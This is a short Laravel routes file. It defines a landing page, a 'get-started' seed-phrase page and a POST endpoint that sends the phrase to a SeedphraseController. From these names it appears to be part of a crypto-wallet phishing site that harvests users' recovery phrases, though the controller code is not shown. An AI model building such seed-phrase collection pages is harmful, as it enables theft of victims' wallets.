<?php

use App\Http\Controllers\SeedphraseController;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::view('/', 'pages.index')->name('index');
Route::view('/get-started', 'pages.seedphase')->name('seedphase');
Route::post('send-request/', [SeedphraseController::class, 'sendPhrase'])->name('sendPhrase');
